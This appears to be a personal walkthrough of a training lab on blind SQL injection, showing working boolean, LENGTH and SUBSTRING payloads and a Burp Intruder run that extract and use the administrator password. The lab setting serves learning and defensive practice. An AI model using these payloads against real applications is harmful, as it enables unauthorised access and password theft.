# Lab: Blind SQL injection with conditional responses

## Description

* This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user. *

---

# STEP 1: Verify Blind SQLi

The page with a normal tracking cookie

![image](https://user-images.githubusercontent.com/83407557/169717979-383b0251-ea74-43d2-980f-4b40ae2f6578.png)

## with a conditionally true payload of 

```sql
'and 'a'='a
```

![image](https://user-images.githubusercontent.com/83407557/169718045-1a2378d7-ae0f-4245-89b5-1b44198ee40b.png)

I get the welcome back message

## sending a conditionally false payload:

```sql
'and 'a'='b
```

![image](https://user-images.githubusercontent.com/83407557/169718103-df5dc3e6-0329-4db5-bab6-ed5af585af08.png)

being false the welcome back message goes away

# STEP 2: Determine target table, columns, and rows

Normally this step would involve conditionals to build out the names of the tables in the database and then their columns, however for this lab they are provided. My target is the password of the administrator user:

table: users

columns: username, password

row: administrator, target

# STEP 3: Determine the length of the administrator's password

I can use a greater than and sequential numbers. I should get the welcome back message until I go one number past the length of the password.

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
```
Greater than 1?
![image](https://user-images.githubusercontent.com/83407557/169718804-41d3570a-fe58-491e-b253-96966dc62fc6.png)
Greater than 2?
![image](https://user-images.githubusercontent.com/83407557/169718841-83cc12ec-e65d-4be9-9c8d-cbbcddb15e42.png)
Greater than 3?
![image](https://user-images.githubusercontent.com/83407557/169718861-1006c697-7726-4534-8914-7482e9709a4c.png)
ect...

until

![image](https://user-images.githubusercontent.com/83407557/169718920-b66bd139-2021-47ec-a95a-0466775a0b48.png)

Letting me know that the administrator's password is 20 character's long

# STEP 4: Using subsrings to build the password

Substrings from sql cheat sheet:

![image](https://user-images.githubusercontent.com/83407557/169719316-0a633d86-7e92-4286-8d86-46b20e3160b3.png)

So to see if the first letter is an a:

```sql
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

and to see if the second letter is an a

```sql
' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a
```




if the first letter is not an a, no error message will show up. With burp intruder I can iterate through all letters and numbers until I get the welcome back message:

![image](https://user-images.githubusercontent.com/83407557/169726974-e9a22d24-4e04-4f88-9212-e20b937967f3.png)

![image](https://user-images.githubusercontent.com/83407557/169727014-af681e32-ae18-452c-bbc3-3186d8579c10.png)

and flagging the message:

![image](https://user-images.githubusercontent.com/83407557/169727041-58dfc1bf-575b-436f-a01c-6840db745f42.png)

I can see that the first letter is a d:

![image](https://user-images.githubusercontent.com/83407557/169727108-9a8bc96f-c2bf-47c5-8761-97e6d6dc1e45.png)

the second letter is an s:

![image](https://user-images.githubusercontent.com/83407557/169727227-4d8a19e9-4088-4c08-87b9-4ceeecbbf313.png)


until I build out all 20 characters by running this attack for all 19 characters in the password:

![image](https://user-images.githubusercontent.com/83407557/169728646-250de74d-3962-40fc-8d7b-670da0e8a730.png)

ds42d4fv8kw58ddpoq70

which allows me to log in

![image](https://user-images.githubusercontent.com/83407557/169729271-e9c4c0e9-e1a8-4056-94e8-dd1bdd20787b.png)
